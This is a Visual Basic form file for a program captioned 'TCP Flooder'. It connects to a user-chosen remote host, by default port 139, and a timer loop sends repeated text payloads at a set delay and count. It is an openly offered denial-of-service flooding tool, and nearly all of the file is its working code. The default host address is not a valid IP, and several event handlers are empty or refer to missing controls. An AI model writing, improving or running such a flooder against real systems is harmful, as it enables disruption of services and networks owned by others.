VERSION 4.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "TCP Flooder"
   ClientHeight    =   3975
   ClientLeft      =   1440
   ClientTop       =   1680
   ClientWidth     =   4230
   Height          =   4665
   Icon            =   "tcpflud.frx":0000
   Left            =   1380
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3975
   ScaleWidth      =   4230
   Top             =   1050
   Width           =   4350
   Begin VB.CommandButton cmdClear 
      Caption         =   "Clear"
      Height          =   375
      Left            =   3240
      TabIndex        =   16
      Top             =   3600
      Width           =   975
   End
   Begin VB.CommandButton cmdHalt 
      Caption         =   "Halt"
      Height          =   375
      Left            =   2160
      TabIndex        =   15
      Top             =   3600
      Width           =   975
   End
   Begin VB.Timer Timer1 
      Left            =   4320
      Top             =   480
   End
   Begin VB.CommandButton cmdFlood 
      Caption         =   "Flood"
      Height          =   375
      Left            =   1080
      TabIndex        =   14
      Top             =   3600
      Width           =   975
   End
   Begin VB.CommandButton cmdConnect 
      Caption         =   "Connect"
      Height          =   375
      Left            =   0
      TabIndex        =   13
      Top             =   3600
      Width           =   975
   End
   Begin VB.TextBox status 
      BackColor       =   &H00000000&
      ForeColor       =   &H000000FF&
      Height          =   3615
      Left            =   2040
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   12
      Top             =   0
      Width           =   2175
   End
   Begin VB.TextBox txtLeft 
      BackColor       =   &H00000000&
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      Locked          =   -1  'True
      TabIndex        =   5
      Top             =   3240
      Width           =   2055
   End
   Begin VB.TextBox txtTimes 
      BackColor       =   &H00000000&
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      TabIndex        =   4
      Text            =   "1"
      Top             =   2640
      Width           =   2055
   End
   Begin VB.TextBox txtDelay 
      BackColor       =   &H00000000&
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      TabIndex        =   3
      Text            =   "20"
      Top             =   2040
      Width           =   2055
   End
   Begin VB.TextBox txtSend 
      BackColor       =   &H00000000&
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      TabIndex        =   2
      Text            =   $"tcpflud.frx":0442
      Top             =   1440
      Width           =   2055
   End
   Begin VB.TextBox txtPort 
      BackColor       =   &H00000000&
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Text            =   "139"
      Top             =   840
      Width           =   2055
   End
   Begin VB.TextBox txtHost 
      BackColor       =   &H00000000&
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Text            =   "206.423.7.5"
      Top             =   240
      Width           =   2055
   End
   Begin WINSOCKLib.TCP TCP 
      Left            =   4320
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      Blocking        =   0   'False
      SleepTime       =   10
      RemoteHost      =   ""
      RemotePort      =   0
      LocalPort       =   0
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      Caption         =   "Amount Left"
      Height          =   255
      Left            =   0
      TabIndex        =   11
      Top             =   3000
      Width           =   2055
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      Caption         =   "Number Of TimesTo Send"
      Height          =   255
      Left            =   0
      TabIndex        =   10
      Top             =   2400
      Width           =   2055
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      Caption         =   "Delay In Milliseconds"
      Height          =   255
      Left            =   0
      TabIndex        =   9
      Top             =   1800
      Width           =   2055
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      Caption         =   "Text To Send"
      Height          =   255
      Left            =   0
      TabIndex        =   8
      Top             =   1200
      Width           =   2055
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Caption         =   "Remote Port"
      Height          =   255
      Left            =   0
      TabIndex        =   7
      Top             =   600
      Width           =   2055
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Caption         =   "Remote Host"
      Height          =   255
      Left            =   0
      TabIndex        =   6
      Top             =   0
      Width           =   2055
   End
   Begin VB.Menu mnu1 
      Caption         =   "File"
      Begin VB.Menu mnu2 
         Caption         =   "&Connect"
         Shortcut        =   ^C
      End
      Begin VB.Menu mnu3 
         Caption         =   "&Flood"
         Shortcut        =   ^F
      End
      Begin VB.Menu mnu4 
         Caption         =   "&Stop"
         Shortcut        =   ^S
      End
      Begin VB.Menu mnu5 
         Caption         =   "E&xit"
         Shortcut        =   ^X
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_Creatable = False
Attribute VB_Exposed = False
Private Sub cmdClear_Click()
status.Text = "¤¤¤¤¤ TCP Flooder ¤¤¤¤¤" & "¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤"
End Sub

Private Sub cmdConnect_Click()
  txtLeft.Text = txtTimes.Text
  TCP.Connect txtHost.Text, txtPort.Text
  status.Text = status.Text & "Attempting To Connect To:" & txtHost.Text & ":" & txtPort.Text
  If txtLeft = 0 Then
    Timer1.Enabled = False
    status.Text = status.Text & "      TCP Flood Complete"
  End If
End Sub

Private Sub cmdFlood_Click()
  Timer1.Interval = txtDelay.Text
  Timer1.Enabled = True
End Sub


Private Sub Command1_Click()

End Sub

Private Sub cmdHalt_Click()
  Timer1.Enabled = False
  status.Text = status.Text & "Flooding has been Halted"
End Sub

Private Sub Form_Load()
  txtLeft.Text = txtTimes.Text
  status.Text = "¤¤¤¤¤ TCP Flooder ¤¤¤¤¤" & "¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤"
End Sub


Private Sub TCP1_Error(Number As Integer, Description As String, Scode As Long, Source As String, HelpFile As String, HelpContext As Long, CancelDisplay As Boolean)

End Sub


Private Sub Text3_Change()

End Sub


Private Sub Text6_Change()

End Sub


Private Sub mnu2_Click()
  txtLeft.Text = txtTimes.Text
  TCP.Connect txtHost.Text, txtPort.Text
  status.Text = status.Text & "Attempting To Connect To:" & txtHost.Text & ":" & txtPort.Text
  If txtLeft = 0 Then
    Timer1.Enabled = False
    status.Text = status.Text & "¤¤¤¤¤ TCP Flood Complete ¤¤¤¤¤"
  End If
End Sub

Private Sub mnu3_Click()
  Timer1.Interval = txtDelay.Text
  Timer1.Enabled = True
End Sub

Private Sub mnu4_Click()
  Timer1.Enabled = False
  status.Text = status.Text & "Flooding Has Been Stopped"
End Sub

Private Sub mnu5_Click()
  Unload Me
End Sub

Private Sub mnu7_Click()
  Form2.Show
  Unload Me
End Sub

Private Sub Timer1_Timer()
  Timer1.Interval = txtDelay.Text
  If txtLeft.Text = 0 Then GoTo timer1_finish
  TCP.SendData txtSend.Text
  txtLeft.Text = txtLeft.Text - 1
  Exit Sub
timer1_finish:
  Timer1.Enabled = False
  status.Text = status.Text & "¤¤¤¤¤ TCP Flood Complete ¤¤¤¤¤"
  Exit Sub
End Sub

